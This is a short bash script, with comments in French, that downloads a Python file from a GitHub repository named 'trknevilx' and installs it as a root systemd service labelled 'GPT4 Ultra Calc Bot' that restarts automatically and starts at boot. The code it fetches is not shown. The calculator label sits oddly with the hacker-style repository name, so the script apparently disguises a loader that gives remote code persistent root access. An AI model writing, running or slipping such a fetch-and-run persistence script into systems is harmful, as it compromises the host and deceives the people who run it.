#!/bin/bash

SCRIPT_URL="https://raw.githubusercontent.com/trh4ckn0n/trknevilx/refs/heads/main/main.py"
SERVICE_NAME="gpt4_calc.service"
INSTALL_PATH="/app/ultra_calc_bot.py"

curl -sL $SCRIPT_URL -o $INSTALL_PATH
chmod +x $INSTALL_PATH

# Création du service local (pour usage dans le conteneur)
cat <<EOF > /etc/systemd/system/$SERVICE_NAME
[Unit]
Description=GPT4 Ultra Calc Bot
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/python $INSTALL_PATH
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Activer le service
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME
